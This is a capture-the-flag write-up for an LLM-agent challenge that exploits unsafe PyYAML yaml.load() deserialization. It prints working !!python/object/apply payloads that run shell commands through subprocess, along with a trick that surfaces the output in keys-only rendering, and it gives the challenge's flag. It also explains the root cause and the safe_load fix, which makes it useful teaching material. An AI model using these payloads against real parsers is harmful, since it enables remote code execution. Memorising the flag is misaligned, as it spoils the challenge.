---
title: "Arkx — The Shape Shifter"
platform: "Arkx"
track: "Expert"
level: "Level 6"
vuln: "Unsafe YAML deserialization (yaml.load) → RCE"
severity: "Critical"
flag: "flag-ed500f"
owasp: ["LLM05 Improper Output Handling", "LLM06 Excessive Agency"]
atlas: ["AML.T0053 LLM Plugin Compromise", "AML.T0051 LLM Prompt Injection"]
image: "/arkx/e6-shape-shifter.jpg"
order: 4
date: 2026-11-13
tags: ["ai", "llm", "rce", "deserialization", "yaml"]
summary: "A config processor parses your YAML with yaml.load() and prints only the keys — so put the result of code execution in the key position."
draft: false
---

## Result

The *Shape Shifter* exposes a "Configuration Processor" that parses user-supplied YAML with **`yaml.load()`** (the unsafe loader) and echoes back only the config's **keys**. PyYAML object tags execute arbitrary Python — the challenge is surfacing the output when only keys are shown.

**Flag:** `flag-ed500f`

## Exploit

**1 — Prove execution.** A `!!python/object/apply` tag runs code, but the value side is swallowed (keys-only output):

```yaml
{flagval: !!python/object/apply:subprocess.check_output [["cat","flag.txt"]]}
```

**2 — Diagnose the type.** `check_output` returns `bytes`; the renderer throws *"expected str instance, bytes found"* — confirming execution, wrong type.

**3 — Final payload.** Force a `str` (`text: true`) and place the command output in the **key** position so it gets printed:

```yaml
{? !!python/object/apply:subprocess.check_output {args: [["cat","flag.txt"]], kwds: {text: true}} : m}
```

Rendered as:

```text
Example key: flag-ed500f
```

## Root cause

`yaml.load()` with the default/unsafe loader on untrusted input allows arbitrary object construction and function invocation (CWE-502). The "keys-only" output is an information-flow restriction, not a safety control, and is trivially sidestepped by putting executed output in a key.

## Impact

Remote code execution in the agent runtime from a crafted configuration document. One-line fix: `yaml.safe_load()`.
